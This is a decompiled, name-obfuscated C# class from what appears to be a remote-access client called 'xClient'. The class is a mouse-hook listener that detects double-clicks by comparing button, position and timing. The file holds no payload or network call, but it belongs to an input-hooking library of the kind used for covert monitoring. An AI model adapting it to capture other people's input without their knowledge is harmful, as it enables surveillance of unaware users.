using System.Windows.Forms;
using xClient.Core.MouseKeyHook.Implementation;

internal class Class18 : MouseListener
{
	private readonly int int_0;

	private MouseButtons mouseButtons_0;

	private Struct4 struct4_0;

	private int int_1;

	public Class18()
		: base(Class4.smethod_2)
	{
		int_0 = Class13.GetDoubleClickTime();
	}

	protected override void ProcessDown(ref GEventArgs2 e)
	{
		if (method_2(e))
		{
			e = e.method_0();
		}
		base.ProcessDown(ref e);
	}

	protected override void ProcessUp(ref GEventArgs2 e)
	{
		base.ProcessUp(ref e);
		if (((MouseEventArgs)e).get_Clicks() == 2)
		{
			method_1();
		}
		if (((MouseEventArgs)e).get_Clicks() == 1)
		{
			method_0(e);
		}
	}

	private void method_0(GEventArgs2 e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		mouseButtons_0 = ((MouseEventArgs)e).get_Button();
		int_1 = e.Timestamp;
		struct4_0 = e.Point;
	}

	private void method_1()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		mouseButtons_0 = (MouseButtons)0;
		int_1 = 0;
		struct4_0 = new Struct4(0, 0);
	}

	private bool method_2(GEventArgs2 e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		if (((MouseEventArgs)e).get_Button() == mouseButtons_0 && Struct4.smethod_0(e.Point, struct4_0))
		{
			return e.Timestamp - int_1 <= int_0;
		}
		return false;
	}

	protected override GEventArgs2 GetEventArgs(Struct1 data)
	{
		return GEventArgs2.smethod_1(data);
	}
}
